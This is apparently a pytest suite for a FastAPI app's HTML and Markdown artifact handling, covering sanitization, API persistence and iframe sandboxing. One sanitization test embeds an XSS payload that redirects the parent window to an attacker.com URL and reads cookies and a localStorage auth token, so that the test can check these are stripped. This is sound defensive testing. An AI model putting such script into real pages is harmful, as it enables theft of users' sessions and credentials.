import pytest
from unittest.mock import patch, AsyncMock
from fastapi import status
from backend.app.tools.base import create_artifact_domain, sanitize_html_artifact
from backend.app.schemas.session import SessionCreate

def test_create_markdown_artifact_domain():
    """Verify creating a valid Markdown artifact."""
    art = create_artifact_domain(
        title="PLG Activation Framework",
        artifact_type="markdown",
        content="# Activation Framework\n\n- Step 1: Signup\n- Step 2: Aha moment"
    )
    assert art["title"] == "PLG Activation Framework"
    assert art["artifact_type"] == "markdown"
    assert "# Activation Framework" in art["content"]


def test_create_html_artifact_domain_sanitization():
    """Verify that HTML artifacts are sanitized to remove malicious XSS and parent-window escapes."""
    unsafe_payload = """
    <div class="dashboard">
        <h1>North Star Metric Tracker</h1>
        <p>Current MAU: 50,000</p>
    </div>
    <script>
        window.parent.location = 'http://attacker.com/steal';
        var stolenCookie = document.cookie;
        var token = localStorage.getItem('auth_token');
    </script>
    <a href="javascript:alert('pwned')">Click here</a>
    <img src="invalid-image" onerror="alert('xss')">
    """

    art = create_artifact_domain(
        title="Interactive Dashboard",
        artifact_type="html",
        content=unsafe_payload
    )

    assert art["title"] == "Interactive Dashboard"
    assert art["artifact_type"] == "html"
    content = art["content"]

    # Security invariants:
    # 1. Neutralized parent frame navigation
    assert "window.parent" not in content
    # 2. Neutralized cookie theft
    assert "document.cookie" not in content
    # 3. Neutralized local storage access
    assert "localStorage" not in content
    # 4. Neutralized javascript: pseudo-protocol
    assert "javascript:" not in content
    # 5. Stripped onerror event handler
    assert "onerror=" not in content
    # 6. Preserved legitimate HTML structure
    assert '<div class="dashboard">' in content
    assert "<h1>North Star Metric Tracker</h1>" in content


def test_create_artifact_invalid_type_raises_error():
    """Verify that an invalid artifact type raises ValueError."""
    with pytest.raises(ValueError) as excinfo:
        create_artifact_domain("Bad Artifact", "exe", "malicious_binary")
    assert "Invalid artifact_type" in str(excinfo.value)


def test_artifact_persistence_and_retrieval_api(client):
    """Verify end-to-end artifact creation and retrieval via API."""
    # 1. Create a session
    sess_res = client.post("/api/sessions", json={"title": "Artifact Session", "provider": "ollama"})
    assert sess_res.status_code == status.HTTP_201_CREATED
    session_id = sess_res.json()["id"]

    # 2. Send chat message returning an artifact
    mock_chat_result = {
        "content": "Here is the requested dashboard component.",
        "sources": [],
        "artifact": {
            "title": "Growth Dashboard",
            "artifact_type": "html",
            "content": "<div class='metric-card'><h3>MRR</h3><p>$120,000</p></div>"
        },
        "provider_used": "ollama",
        "model_used": "qwen2.5:3b"
    }

    with patch("backend.app.api.chat.get_agent_adapter") as mock_adapter_getter:
        mock_adapter = AsyncMock()
        mock_adapter.run_agent.return_value = mock_chat_result
        mock_adapter_getter.return_value = mock_adapter

        chat_res = client.post("/api/chat", json={
            "session_id": session_id,
            "message": "Create an HTML dashboard component for MRR metrics.",
            "provider": "ollama"
        })

        assert chat_res.status_code == status.HTTP_200_OK
        data = chat_res.json()
        assert data["artifact"] is not None
        assert data["artifact"]["title"] == "Growth Dashboard"
        assert data["artifact"]["artifact_type"] == "html"
        assert "<div class='metric-card'>" in data["artifact"]["content"]

    # 3. Retrieve session artifacts via GET /api/sessions/{session_id}/artifacts
    art_res = client.get(f"/api/sessions/{session_id}/artifacts")
    assert art_res.status_code == status.HTTP_200_OK
    artifacts = art_res.json()
    assert len(artifacts) == 1
    assert artifacts[0]["title"] == "Growth Dashboard"
    assert artifacts[0]["artifact_type"] == "html"


def test_iframe_sandbox_policy_in_frontend():
    """Verify that frontend/index.html enforces restrictive sandbox permissions on the artifact iframe."""
    with open("frontend/index.html", "r", encoding="utf-8") as f:
        html = f.read()

    # The iframe must declare sandbox="allow-scripts" without allow-same-origin
    # to guarantee opaque null origin isolation
    assert 'sandbox="allow-scripts"' in html
    assert 'allow-same-origin' not in html, "Security violation: allow-same-origin must NOT be granted to untrusted artifacts"
